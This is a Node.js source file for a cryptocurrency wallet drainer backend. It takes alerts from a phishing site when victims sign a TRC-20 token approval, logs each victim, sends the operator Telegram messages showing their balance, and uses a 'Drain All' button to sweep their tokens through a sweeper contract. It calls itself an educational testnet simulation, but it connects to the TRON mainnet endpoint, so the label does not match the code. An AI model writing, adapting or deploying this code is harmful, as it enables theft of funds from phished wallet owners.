require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Telegraf } = require('telegraf');
const { TronWeb } = require('tronweb');

const app = express();
app.use(cors());
app.use(express.json());

// Initialize TronWeb for Shasta Testnet
const tronWeb = new TronWeb({
  fullHost: 'https://api.trongrid.io',
  privateKey: process.env.ATTACKER_PRIVATE_KEY
});

const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const SWEEPER_ADDRESS = process.env.SWEEPER_ADDRESS;
const DECIMALS = 6;

// Initialize Telegram Bot
const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// In-memory storage
const victims = [];

// Helper: format balance
const fmt = (n) => Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

// Helper: read balance
async function readBalance(addr) {
  try {
    const c = await tronWeb.contract().at(TOKEN_ADDRESS);
    const raw = await c.balanceOf(addr).call();
    return Number(raw.toString()) / 10 ** DECIMALS;
  } catch (e) {
    console.error('Balance read error:', e.message);
    return 0;
  }
}

// ============ TELEGRAM COMMANDS WITH INLINE BUTTONS ============

// /start command - Shows a welcome message with command buttons
bot.start((ctx) => {
  const message = 
    `🤖 *QR Drainer Bot - Educational PoC*\n\n` +
    `This bot monitors TRC-20 approval attacks on the Shasta testnet.\n\n` +
    `*How to use:*\n` +
    `1. Victim connects wallet to the phishing site\n` +
    `2. Victim clicks "Claim" (signs approve)\n` +
    `3. You receive an alert here with their balance\n` +
    `4. Click "Drain All" to execute the attack\n\n` +
    `⚠️ *SIMULATION ONLY* - No real funds involved.`;
  
  const keyboard = {
    inline_keyboard: [
      [
        { text: '🧪 Test Bot', callback_data: 'cmd_test' },
        { text: '📊 Status', callback_data: 'cmd_status' }
      ],
      [
        { text: '📖 Help', callback_data: 'cmd_help' }
      ]
    ]
  };

  ctx.reply(message, { parse_mode: 'Markdown', reply_markup: keyboard });
  console.log('[BOT] /start command received');
});

// Handle command button clicks
bot.action('cmd_test', (ctx) => {
  ctx.reply(
    `🔧 *Telegram test — SIMULATION*\n\n` +
    `The PoC backend is wired up. Approval + TEST SUCCESSFUL alerts will appear here.\n` +
    `No real funds are involved.`,
    { parse_mode: 'Markdown' }
  );
});

bot.action('cmd_status', (ctx) => {
  if (victims.length === 0) {
    ctx.reply('📊 No victims yet. Waiting for approvals...');
  } else {
    let msg = `📊 *Current Victims (${victims.length})*\n\n`;
    victims.forEach((v, i) => {
      msg += `${i + 1}. \`${v.address}\` - ${v.status}\n`;
    });
    ctx.reply(msg, { parse_mode: 'Markdown' });
  }
});

bot.action('cmd_help', (ctx) => {
  ctx.reply(
    `📖 *Help*\n\n` +
    `This bot demonstrates a TRC-20 approval drainer for educational purposes.\n\n` +
    `*Commands:*\n` +
    `/start - Show main menu\n` +
    `/test - Test bot connectivity\n` +
    `/status - Show current victims\n` +
    `/help - Show this help\n\n` +
    `⚠️ *SIMULATION ONLY* - Shasta testnet mock tokens only.`,
    { parse_mode: 'Markdown' }
  );
});

// ============ API ENDPOINTS ============

// 1. Frontend -> backend when victim approves
app.post('/api/alert', async (req, res) => {
  const { victimAddress, txHash } = req.body;
  
  if (!victims.find(v => v.address === victimAddress)) {
    victims.push({ address: victimAddress, status: 'APPROVED', time: Date.now() });
  }

  console.log(`\n[ALERT] Victim Approved: ${victimAddress}`);

  let bal = 0;
  try { bal = await readBalance(victimAddress); } catch (e) { console.error('balance read failed', e.message); }

  const message =
    `🚨 *APPROVAL DETECTED* 🚨\n\n` +
    `👤 Victim: \`${victimAddress}\`\n` +
    `💰 Current mock balance: **${fmt(bal)} mUSDT**\n` +
    `🔗 Approve Tx: [view](https://tronscan.org/#/transaction/${txHash})\n\n` +
    `Tap below to inspect, then drain.`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: '📊 Show Balance', callback_data: `bal_${victimAddress}` },
        { text: '🕷️ Drain All',    callback_data: `sweep_${victimAddress}` },
      ],
    ],
  };

  try {
    await bot.telegram.sendMessage(CHAT_ID, message, { parse_mode: 'Markdown', reply_markup: keyboard });
    res.json({ success: true });
  } catch (err) {
    console.error('Telegram error:', err.message);
    res.status(500).json({ error: err.message });
  }
});

// 2. "Show Balance" button (read-only, no gas)
bot.action(/bal_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Reading...');
  try {
    const bal = await readBalance(addr);
    const time = new Date().toLocaleTimeString();
    
    await ctx.editMessageText(
      `📊 *Balance check (at ${time})*\n👤 \`${addr}\`\n💰 **${fmt(bal)} mUSDT**`,
      { parse_mode: 'Markdown' }
    );
  } catch (e) {
    if (e.description && e.description.includes('message is not modified')) return;
    await ctx.editMessageText(`❌ Read failed: ${e.message}`);
  }
});

// 3. "Drain All" button (write, executes sweepAll)
bot.action(/sweep_(.+)/, async (ctx) => {
  const addr = ctx.match[1];
  await ctx.answerCbQuery('Initiating transferFrom...');
  await ctx.editMessageText(`🕷️ *Sweeping from* \`${addr}\`...\nwaiting for confirmation.`, { parse_mode: 'Markdown' });
  try {
    const sw = await tronWeb.contract().at(SWEEPER_ADDRESS);
    const tx = await sw.sweepAll(TOKEN_ADDRESS, addr).send({ feeLimit: 100000000 });
    let info = await tronWeb.trx.getTransactionInfo(tx);
    let tries = 0;
    while ((!info || !info.id) && tries < 15) {
      await new Promise(r => setTimeout(r, 2000));
      info = await tronWeb.trx.getTransactionInfo(tx);
      tries++;
    }
    if (info && info.id) {
      const bal = await readBalance(addr).catch(() => 0);
      await ctx.editMessageText(
        `✅ *DRAINED*\n👤 \`${addr}\`\n💸 Sweep Tx: [view](https://tronscan.org/#/transaction/${tx})\n💰 Remaining: **${fmt(bal)} mUSDT**`,
        { parse_mode: 'Markdown' }
      );
      const v = victims.find(x => x.address === addr); if (v) v.status = 'DRAINED';
    } else {
      await ctx.editMessageText(`❌ Not confirmed in time.`);
    }
  } catch (e) {
    console.error('Sweep error:', e);
    await ctx.editMessageText(`❌ *Sweep failed*\n${e.message || e}`, { parse_mode: 'Markdown' });
  }
});

// Admin dashboard endpoints
app.get('/api/victims', (req, res) => res.json(victims));
app.post('/api/drained', (req, res) => {
  const v = victims.find(x => x.address === req.body.address);
  if (v) { v.status = 'DRAINED'; v.drainTx = req.body.txHash; }
  res.json({ success: true });
});

// ============ START SERVER ============

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`\n🛡️ Backend running on port ${PORT}`);
  console.log(`🤖 Telegram bot initialized.`);
  console.log(`📡 Listening for frontend alerts...\n`);
});

// Launch bot
bot.launch().then(() => {
  console.log('✅ Telegram bot is now listening for commands.');
}).catch((err) => {
  console.error('❌ Bot launch failed:', err.message);
});

// Graceful shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));